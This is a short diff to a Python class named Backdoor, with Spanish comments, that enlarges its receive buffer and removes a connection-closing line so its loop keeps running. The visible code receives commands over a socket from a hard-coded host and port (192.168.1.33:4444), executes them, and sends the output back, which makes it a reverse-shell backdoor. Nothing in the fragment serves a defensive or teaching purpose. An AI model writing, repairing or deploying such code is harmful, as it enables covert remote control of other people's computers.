@@ -28,7 +28,7 @@ class Backdoor:
             command = self.connection.recv(1024000)  # ← ✅ CAMBIADO DE 1024 A 1024000 (1 MB)
             resultadosComando = self.ejecutarComando(command)
             self.connection.send(resultadosComando)          
-            connection.close()
+
 
 puerta = Backdoor("192.168.1.33",4444)
 puerta.run()
